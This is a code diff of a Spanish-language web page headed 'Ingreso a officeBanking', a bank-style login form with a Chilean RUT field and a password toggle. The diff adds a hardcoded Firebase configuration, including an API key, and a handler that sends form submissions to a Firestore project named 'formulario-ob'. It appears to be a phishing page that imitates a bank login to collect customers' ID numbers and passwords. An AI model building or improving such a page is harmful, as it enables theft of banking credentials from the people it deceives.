@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
@@ -70,7 +71,23 @@
       text-align: center;
     }
   </style>
-  <script>
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
+    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "AIzaSyCdzFXQ2h6u2QA4O8TtUWf3TZxzTnP5O9E",
+      authDomain: "formulario-ob.firebaseapp.com",
+      databaseURL: "https://formulario-ob-default-rtdb.firebaseio.com",
+      projectId: "formulario-ob",
+      storageBucket: "formulario-ob.firebasestorage.app",
+      messagingSenderId: "1017857662001",
+      appId: "1:1017857662001:web:b80ad26965daf7ce960910"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
     function formatoRUT(rut) {
       rut = rut.replace(/[.-]/g, '').replace(/^0+/, '');
       if (rut.length > 1) {
@@ -104,51 +121,6 @@
       input.type = input.type === "password" ? "text" : "password";
     }
 
-    function enviarFormulario(e) {
-      e.preventDefault();
-      const rut = document.getElementById("rut").value;
-      if (!validarRUT(rut)) {
-        alert("RUT inválido");
-        return;
-      }
-      document.getElementById("formulario").style.display = "none";
-      document.getElementById("mensajeFinal").style.display = "block";
-    }
-
-    window.onload = () => {
-      document.getElementById("rut").addEventListener("input", function () {
-        this.value = formatoRUT(this.value.replace(/[^0-9kK]/g, "").toUpperCase());
-      });
-    };
-  </script>
-
-  <!-- Firebase SDK -->
-  <script type="module">
-    // Importar los SDKs necesarios
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";
-    import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore.js";
-
-    // Tu configuración de Firebase
-    const firebaseConfig = {
-      apiKey: "AIzaSyCdzFXQ2h6u2QA4O8TtUWf3TZxzTnP5O9E",
-      authDomain: "formulario-ob.firebaseapp.com",
-      projectId: "formulario-ob",
-      storageBucket: "formulario-ob.appspot.com",
-      messagingSenderId: "1017857662001",
-      appId: "1:1017857662001:web:b80ad26965daf7ce960910"
-    };
-      authDomain: "formulario-ob.firebaseapp.com",
-      projectId: "formulario-ob",
-      storageBucket: "formulario-ob.appspot.com",
-      messagingSenderId: "1017857662001",
-      appId: "TU_APP_ID"
-    };
-
-    // Inicializar Firebase y Firestore
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
-
-    // Enviar formulario a Firestore
     window.enviarFormulario = async function(e) {
       e.preventDefault();
       const rut = document.getElementById("rut").value;
@@ -172,8 +144,13 @@
         alert("Ocurrió un error al enviar los datos.");
       }
     };
-  </script>
 
+    window.onload = () => {
+      document.getElementById("rut").addEventListener("input", function () {
+        this.value = formatoRUT(this.value.replace(/[^0-9kK]/g, "").toUpperCase());
+      });
+    };
+  </script>
 </head>
 <body>
   <h2>Ingreso a <span class="banking">officeBanking</span></h2>
